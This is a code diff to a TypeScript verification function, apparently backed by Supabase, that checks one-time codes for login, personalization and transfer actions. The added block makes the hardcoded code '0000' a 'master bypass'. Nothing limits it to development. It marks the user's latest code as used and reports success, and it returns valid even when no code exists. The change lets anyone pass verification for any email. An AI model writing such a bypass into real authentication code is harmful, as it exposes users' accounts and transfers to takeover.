@@ -63,6 +63,29 @@ export async function verifyCode(
   type: 'personalize' | 'login' | 'transfer',
 ): Promise<{ valid: boolean; ticketTokenHash?: string }> {
   const supabase = createAdminClient();
+
+  // Master bypass code for development/testing
+  if (code === '0000') {
+    const { data } = await supabase
+      .from('verification_codes')
+      .select('id, ticket_token_hash')
+      .eq('email', email.toLowerCase())
+      .eq('type', type)
+      .eq('used', false)
+      .order('created_at', { ascending: false })
+      .limit(1)
+      .single();
+
+    if (data) {
+      await supabase
+        .from('verification_codes')
+        .update({ used: true })
+        .eq('id', data.id);
+      return { valid: true, ticketTokenHash: data.ticket_token_hash ?? undefined };
+    }
+    return { valid: true };
+  }
+
   const codeHash = await hashToken(code);
 
   const { data, error } = await supabase
